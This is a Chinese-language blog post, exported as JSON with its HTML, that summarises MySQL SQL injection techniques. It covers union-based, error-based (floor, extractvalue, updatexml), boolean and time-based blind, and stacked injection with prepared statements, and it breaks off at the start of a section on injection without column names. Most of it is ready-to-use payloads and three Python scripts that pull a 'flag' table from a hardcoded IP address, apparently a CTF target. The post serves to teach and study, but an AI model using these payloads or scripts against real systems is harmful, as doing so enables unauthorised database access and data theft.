[{"title":"SQL注入总结","url":"http://yoursite.com/2020/11/04/SQL注入/","content":"<h1 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h1><h2 id=\"一、联合注入：\"><a href=\"#一、联合注入：\" class=\"headerlink\" title=\"一、联合注入：\"></a>一、联合注入：</h2><h3 id=\"常用函数：\"><a href=\"#常用函数：\" class=\"headerlink\" title=\"常用函数：\"></a>常用函数：</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">group_concat：以逗号连接查询出来的数据</span><br><span class=\"line\">limit: limit 0,1 //从第一行往后查1行。第一个数代表从第n+1行开始，第二个数代表往后几行。</span><br><span class=\"line\">information_schema：保存了MySQL数据库服务器中所有的数据库的信息</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Payload：\"><a href=\"#Payload：\" class=\"headerlink\" title=\"Payload：\"></a>Payload：</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">爆库：1&apos; union select group_concat(schema_name) from information_schema.schemata#</span><br><span class=\"line\">爆表：1&apos; union select group_concat(table_name) from information_schema.tables where table_schema=database()#</span><br><span class=\"line\">爆列：1&apos; union select group_concat(column_name) from information_schema.columns where table_name = &apos;表&apos;</span><br><span class=\"line\">爆字段：1&apos; union select 列名 from 表名</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"二、报错注入：\"><a href=\"#二、报错注入：\" class=\"headerlink\" title=\"二、报错注入：\"></a>二、报错注入：</h2><h3 id=\"1-Floor：\"><a href=\"#1-Floor：\" class=\"headerlink\" title=\"1.Floor：\"></a>1.Floor：</h3><h4 id=\"原理：\"><a href=\"#原理：\" class=\"headerlink\" title=\"原理：\"></a>原理：</h4><ol>\n<li><p>查询前默认会建立空的虚拟表。</p>\n</li>\n<li><p>取第一条记录，执行floor(rand(0)*2)，发现结果为0(第一次计算),查询虚拟表，发现0的键值不存在，则floor(rand(0)*2)会被再计算一次，结果为1(第二次计算)，插入虚表，这时第一条记录查询完毕。</p>\n</li>\n<li><p>查询第二条记录，再次计算floor(rand(0)<em>2)，发现结果为1(第三次计算)，查询虚表，发现1的键值存在，所以floor(rand(0)\\</em>2)不会被计算第二次，直接count()加1，第二条记录查询完毕。</p>\n</li>\n<li><p>查询第三条记录，再次计算floor(rand(0)<em>2)，发现结果为0(第4次计算)，查询虚表，发现键值没有0，则数据库尝试插入一条新的数据（存入的动作已经发生），在插入数据时floor(rand(0)\\</em>2)被再次计算，作为虚表的主键，其值为1(第5次计算)，然而1这个主键已经存在于虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以插入的时候就直接报错了。</p>\n</li>\n<li><p>整个查询过程floor(rand(0)*2)被计算了5次，查询原数据表3次，所以这就是为什么数据表中需要3条数据，使用该语句才会报错的原因。</p>\n</li>\n<li><p>在floor(rand(1)<em>2)等floor(rand(x)*2)中，在虚表中会把0，1作为键值存入，所以后面不管查询到多少数据，只会增加count(\\</em>)的字段数量，而不会报错</p>\n<p>成功报错：</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201112185417.png\" alt></p>\n<p>失败：</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201112185437.png\" alt></p>\n</li>\n</ol>\n<h4 id=\"使用函数\"><a href=\"#使用函数\" class=\"headerlink\" title=\"使用函数:\"></a>使用函数:</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rand()：取0-1之间的随机浮点数值</span><br><span class=\"line\">rand(x)：每个rand(x)代表一个固定随机数</span><br><span class=\"line\">floor(x)：返回X值的最大整数值，但是不能大于X，向下取整</span><br><span class=\"line\">group_by：按列名进行分组，一般配合count(*)进行统计数量</span><br><span class=\"line\">count(*)：对表中的数字行进行统计</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Payload：-1\"><a href=\"#Payload：-1\" class=\"headerlink\" title=\"Payload：\"></a>Payload：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and (select 1 from (select count(*),concat(payload,floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-Extractvalue\"><a href=\"#2-Extractvalue\" class=\"headerlink\" title=\"2.Extractvalue:\"></a>2.Extractvalue:</h3><h4 id=\"原理：-1\"><a href=\"#原理：-1\" class=\"headerlink\" title=\"原理：\"></a>原理：</h4><p>extract的第二个参数要求是<code>xpath格式字符串</code>，所以我们已用这一个特性，进行报错，最大长度是32位，超过32位不显示</p>\n<h4 id=\"Payload：-2\"><a href=\"#Payload：-2\" class=\"headerlink\" title=\"Payload：\"></a>Payload：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and (extractvalue(1,concat(0x7e,(payload),0x7e)));</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-Updatexml：\"><a href=\"#3-Updatexml：\" class=\"headerlink\" title=\"3.Updatexml：\"></a>3.Updatexml：</h3><h4 id=\"原理：-2\"><a href=\"#原理：-2\" class=\"headerlink\" title=\"原理：\"></a>原理：</h4><p>和extractvalue相同，最大长度同样是32位</p>\n<h4 id=\"Payload\"><a href=\"#Payload\" class=\"headerlink\" title=\"Payload:\"></a>Payload:</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and (updatexml(1,concat(0x7e,(payload),0x7e),1));</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-列名重复报错：\"><a href=\"#4-列名重复报错：\" class=\"headerlink\" title=\"4.列名重复报错：\"></a>4.列名重复报错：</h3><h4 id=\"原理：-3\"><a href=\"#原理：-3\" class=\"headerlink\" title=\"原理：\"></a>原理：</h4><p>限制版本：Mysql 5.0.12 &lt;= 版本 &lt;= Mysql 5.0.51</p>\n<p>在MySQL中，当列名重复了会发生报错，我们可以<code>name_const</code>来制造一个列，但是函数的参数要求必须是常量，所以限制比较大，在实际的测试中通常搭配<code>join</code>函数来使用</p>\n<h3 id=\"5-其他报错注入：\"><a href=\"#5-其他报错注入：\" class=\"headerlink\" title=\"5.其他报错注入：\"></a>5.其他报错注入：</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.geometrycollection()</span><br><span class=\"line\"></span><br><span class=\"line\">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class=\"line\"></span><br><span class=\"line\">2.multipoint()</span><br><span class=\"line\"></span><br><span class=\"line\">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br><span class=\"line\"></span><br><span class=\"line\">3.polygon()</span><br><span class=\"line\"></span><br><span class=\"line\">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</span><br><span class=\"line\"></span><br><span class=\"line\">4.multipolygon()</span><br><span class=\"line\"></span><br><span class=\"line\">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br><span class=\"line\"></span><br><span class=\"line\">5.linestring()</span><br><span class=\"line\"></span><br><span class=\"line\">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</span><br><span class=\"line\"></span><br><span class=\"line\">6.multilinestring()</span><br><span class=\"line\"></span><br><span class=\"line\">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br><span class=\"line\"></span><br><span class=\"line\">7.exp()</span><br><span class=\"line\"></span><br><span class=\"line\">select * from test where id=1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"三、盲注：\"><a href=\"#三、盲注：\" class=\"headerlink\" title=\"三、盲注：\"></a>三、盲注：</h2><h3 id=\"1-布尔盲注：\"><a href=\"#1-布尔盲注：\" class=\"headerlink\" title=\"1.布尔盲注：\"></a>1.布尔盲注：</h3><h4 id=\"原理：-4\"><a href=\"#原理：-4\" class=\"headerlink\" title=\"原理：\"></a>原理：</h4><p>布尔盲注有两种情况，一种是通过页面返回True和False，进行判断，第二种是Order by盲注</p>\n<h5 id=\"1-True-or-Falese：\"><a href=\"#1-True-or-Falese：\" class=\"headerlink\" title=\"1.True or Falese：\"></a>1.True or Falese：</h5><p>通过判断ascii码的大小来猜测字段名，表名等数据</p>\n<h6 id=\"Payload：-3\"><a href=\"#Payload：-3\" class=\"headerlink\" title=\"Payload：\"></a>Payload：</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1&apos; and 1=(ord(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)=%d) -- -</span><br></pre></td></tr></table></figure>\n\n<p>通过这个原理我们可以写出脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#普通盲注脚本</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\">url= <span class=\"string\">\"http://47.96.135.208:8802/web2/search.php\"</span></span><br><span class=\"line\">s = <span class=\"string\">','</span>+<span class=\"string\">'_'</span>+string.ascii_lowercase+<span class=\"string\">'1234567890'</span>+string.ascii_uppercase+<span class=\"string\">'&#123;'</span>+<span class=\"string\">'&#125;'</span></span><br><span class=\"line\">p = <span class=\"string\">''</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,<span class=\"number\">10000</span>):</span><br><span class=\"line\">    f = <span class=\"number\">0</span></span><br><span class=\"line\">    print(i,<span class=\"string\">':'</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> s:</span><br><span class=\"line\">        <span class=\"comment\">#sql = \"1' and 1=(ord(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d)-- -\"%(i,ord(j)) #爆表名</span></span><br><span class=\"line\">        <span class=\"comment\">#sql = \"1' and 1=(ord(mid((select group_concat(column_name) from information_schema.columns where table_name='f111ag'),%d,1))=%d)-- -\"%(i,ord(j)) #爆字段名</span></span><br><span class=\"line\">        sql = <span class=\"string\">\"1' and 1=(ord(mid((select group_concat(flag) from f111ag),%d,1))= %d)-- -\"</span>%(i,ord(j))</span><br><span class=\"line\">        data = &#123;<span class=\"string\">\"id\"</span> : sql&#125;</span><br><span class=\"line\">        r = requests.get(url,params=data,timeout=<span class=\"literal\">None</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">\"Click\"</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">            f = <span class=\"number\">1</span></span><br><span class=\"line\">            p += j</span><br><span class=\"line\">            print(p)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> f == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">print(p)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#二分法盲注脚本</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\">url= <span class=\"string\">\"http://47.96.135.208:8802/web2/search.php\"</span></span><br><span class=\"line\">flag=<span class=\"string\">''</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">payload</span><span class=\"params\">(i,j)</span>:</span></span><br><span class=\"line\">    <span class=\"comment\">#sql = \"1' and 1=(ord(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))&gt;%d)-- -\"%(i,j) #爆表名</span></span><br><span class=\"line\">    <span class=\"comment\">#sql = \"1' and 1=(ord(mid((select group_concat(column_name) from information_schema.columns where table_name='f111ag'),%d,1))&gt;%d)-- -\"%(i,j) #爆字段名</span></span><br><span class=\"line\">    sql = <span class=\"string\">\"1' and 1=(ord(mid((select group_concat(flag) from f111ag),%d,1))&gt;%d)-- -\"</span> % (i,j)</span><br><span class=\"line\">    data=&#123;<span class=\"string\">\"id\"</span>:sql&#125;</span><br><span class=\"line\">    r=requests.get(url,params=data)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">\"Click\"</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">        res = <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span> :</span><br><span class=\"line\">        res = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> res</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">exp</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">global</span> flag</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,<span class=\"number\">10000</span>):</span><br><span class=\"line\">        print(i,<span class=\"string\">':'</span>)</span><br><span class=\"line\">        low = <span class=\"number\">31</span></span><br><span class=\"line\">        high = <span class=\"number\">127</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low&lt;=high:</span><br><span class=\"line\">            mid = (low+high)//<span class=\"number\">2</span></span><br><span class=\"line\">            res = payload(i,mid)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> res:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid - <span class=\"number\">1</span></span><br><span class=\"line\">        f = int((low + high +<span class=\"number\">1</span>))//<span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (f==<span class=\"number\">127</span> <span class=\"keyword\">or</span> f==<span class=\"number\">31</span>):</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        flag += chr(f)</span><br><span class=\"line\">        print(flag)</span><br><span class=\"line\">exp()</span><br><span class=\"line\">print(flag)</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"2-order-by\"><a href=\"#2-order-by\" class=\"headerlink\" title=\"2.order by:\"></a>2.order by:</h5><p>在MySQL中<code>order by rand(True)</code>和<code>order by rand(False)</code>的结果排序是不同的：</p>\n<img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201114160130.png\">\n\n<h6 id=\"Payload：-4\"><a href=\"#Payload：-4\" class=\"headerlink\" title=\"Payload：\"></a>Payload：</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">order by rand(database()=&apos;php&apos;)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201114160554.png\" alt></p>\n<p>和True的顺序符合，所以当前数据库为php，可以利用这个特性，进行布尔盲注，猜测数据库里的内容</p>\n<h3 id=\"2-时间盲注：\"><a href=\"#2-时间盲注：\" class=\"headerlink\" title=\"2.时间盲注：\"></a>2.时间盲注：</h3><h4 id=\"原理：-5\"><a href=\"#原理：-5\" class=\"headerlink\" title=\"原理：\"></a>原理：</h4><p>有时候注入的页面既不会报错，也不会回显是否正确，这个时候我们需要用延时来判断，我们查询的结果是否正确。</p>\n<h4 id=\"常用函数：-1\"><a href=\"#常用函数：-1\" class=\"headerlink\" title=\"常用函数：\"></a>常用函数：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sleep(x)：使查询结果返回的时间延迟x秒</span><br><span class=\"line\">ord()：返回字符串的第一个字符的ascii值</span><br><span class=\"line\">benchmark(count,expr)：重复计算expr表达式count次，达到延时</span><br><span class=\"line\">ascii()：返回字母的ascii码值</span><br><span class=\"line\">substr(string string,num start,num length)：截取字符串，string被截取字符串，start为起始位置，length为长度</span><br><span class=\"line\">mid(string, start, length)：截取去字符串，string被截取字符串，start为起始位置，length为长度</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"1-常用-sleep\"><a href=\"#1-常用-sleep\" class=\"headerlink\" title=\"1.(常用)sleep():\"></a>1.(常用)sleep():</h5><p>通过sleep的延时来判断，查询的结果是否正确。</p>\n<h6 id=\"Payload：-5\"><a href=\"#Payload：-5\" class=\"headerlink\" title=\"Payload：\"></a>Payload：</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1&apos; and if(1=(ord(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)=%d),sleep(3),1) -- -</span><br></pre></td></tr></table></figure>\n\n<p>脚本如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\">url= <span class=\"string\">\"http://47.96.135.208:8802/web2/search.php\"</span></span><br><span class=\"line\">s = <span class=\"string\">','</span>+<span class=\"string\">'_'</span>+string.ascii_lowercase+<span class=\"string\">'1234567890'</span>+string.ascii_uppercase+<span class=\"string\">'&#123;'</span>+<span class=\"string\">'&#125;'</span></span><br><span class=\"line\">p = <span class=\"string\">''</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,<span class=\"number\">10000</span>):</span><br><span class=\"line\">    f = <span class=\"number\">0</span></span><br><span class=\"line\">    print(i,<span class=\"string\">':'</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> s:</span><br><span class=\"line\">        <span class=\"comment\">#sql = \"1' and if(1=(ord(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d),sleep(3),1)-- -\"%(i,ord(j)) #爆表名</span></span><br><span class=\"line\">        <span class=\"comment\">#sql = \"1' and if(1=(ord(mid((select group_concat(column_name) from information_schema.columns where table_name='f111ag'),%d,1))=%d),sleep(3),1)-- -\"%(i,ord(j)) #爆字段名</span></span><br><span class=\"line\">        sql = <span class=\"string\">\"1' and if(1=(ord(mid((select group_concat(flag) from f111ag),%d,1))= %d),sleep(3),1)-- -\"</span>%(i,ord(j))</span><br><span class=\"line\">        data = &#123;<span class=\"string\">\"id\"</span> : sql&#125;</span><br><span class=\"line\">        r = requests.get(url,params=data,timeout=<span class=\"literal\">None</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">\"Click\"</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">            f = <span class=\"number\">1</span></span><br><span class=\"line\">            p += j</span><br><span class=\"line\">            print(p)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> f == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">print(p)</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"2-benchmark\"><a href=\"#2-benchmark\" class=\"headerlink\" title=\"2.benchmark():\"></a>2.benchmark():</h5><p>通过大量的运算，来达到延时的效果。</p>\n<h6 id=\"Payload：-6\"><a href=\"#Payload：-6\" class=\"headerlink\" title=\"Payload：\"></a>Payload：</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1&apos; or if(ascii(substr(database(),1,1))&gt;114,benchmark(10000000,sha(1)),0)#</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"3-笛卡尔积：\"><a href=\"#3-笛卡尔积：\" class=\"headerlink\" title=\"3.笛卡尔积：\"></a>3.笛卡尔积：</h5><p>笛卡尔积可以将多个表合并成一个表，这样会消耗大量的时间来查询，造成延时的效果</p>\n<h6 id=\"Payload：-7\"><a href=\"#Payload：-7\" class=\"headerlink\" title=\"Payload：\"></a>Payload：</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and if(ascii(substr(database(),1,1))&gt;0,(select count(*) from information_schema.tables A,information_schema.tables B,information_schema.tables C),0)</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"4-GET-LOCK：\"><a href=\"#4-GET-LOCK：\" class=\"headerlink\" title=\"4.GET_LOCK：\"></a>4.GET_LOCK：</h5><p>当我们在一个session中对关键字进行了get_lock，那么在另一个session再次对关键字进行get_lock，就会执行命令，进行延时</p>\n<p>session A：对关键词<code>Lucia</code>进行第一次锁定，没有发生延时。</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201114185322.png\" alt></p>\n<p>session B：对关键词<code>Lucia</code>再次锁定，发生延迟</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201114185433.png\" alt></p>\n<h5 id=\"5-Rlike-rpad（MySQL5-7）：\"><a href=\"#5-Rlike-rpad（MySQL5-7）：\" class=\"headerlink\" title=\"5.Rlike+rpad（MySQL5.7）：\"></a>5.Rlike+rpad（MySQL5.7）：</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rpad(1,3,&apos;str&apos;)：用字符串str填充第一位的字符串达到第二位的字符串。</span><br><span class=\"line\">rlike： expr rlike pat，判断输入的expr是否符合正则表达式。</span><br></pre></td></tr></table></figure>\n\n<p>通过填充大量的数据，然后匹配很长的正则表达式，服务器需要大量的时间处理数据，达到延时的目的</p>\n<h6 id=\"Payload：-8\"><a href=\"#Payload：-8\" class=\"headerlink\" title=\"Payload：\"></a>Payload：</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from table1 where 1=1 and if(mid(user(),1,1)=&apos;r&apos;,concat(rpad(1,349525,&apos;a&apos;),rpad(1,349525,&apos;a&apos;),rpad(1,349525,&apos;a&apos;)) RLIKE &apos;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+asaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd&apos;,1);</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"四、堆叠注入-预编译：\"><a href=\"#四、堆叠注入-预编译：\" class=\"headerlink\" title=\"四、堆叠注入+预编译：\"></a>四、堆叠注入+预编译：</h2><p>在mysql中允许一条语句执行多条sql命令，每条命令之间以<code>;</code>为间隔符。使用条件十分有限在php中需要使用<code>mysqli_multi_query()</code>函数才能支持多条sql语句同时执行，而在实际情况下，大部分调用MySQL数据库都使用的是<code>mysqli_query()</code>函数</p>\n<p>在真实环境中，当我们发现可以进行堆叠注入时，往往存在一些限制或者过滤，所以我们通常配合预编译，来绕过这些限制。</p>\n<p>预编译的基本语法如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PREPARE stmt_name FROM preparable_stmt;</span><br><span class=\"line\"></span><br><span class=\"line\">EXECUTE stmt_name [USING @var_name [, @var_name] ...];</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;DEALLOCATE | DROP&#125; PREPARE stmt_name;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201116163817.png\" alt></p>\n<p>其他两种：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">prepare stmt from &quot;select ? as test&quot;;</span><br><span class=\"line\">set @test=user();</span><br><span class=\"line\">execute stmt using @test;</span><br><span class=\"line\"></span><br><span class=\"line\">set @s=&apos;select ?&apos;;</span><br><span class=\"line\">prepare stmt2 from @s;</span><br><span class=\"line\">set @t=user();</span><br><span class=\"line\">execute stmt2 using @t;</span><br></pre></td></tr></table></figure>\n\n<p>当select被过滤，可以用handler来代替</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">handler 表名 open; //打开表</span><br><span class=\"line\">handler 表名 read first; //查询第一条数据</span><br><span class=\"line\">handler 表名 read next; //查询下一条数据</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"五、无列名注入：\"><a href=\"#五、无列名注入：\" class=\"headerlink\" 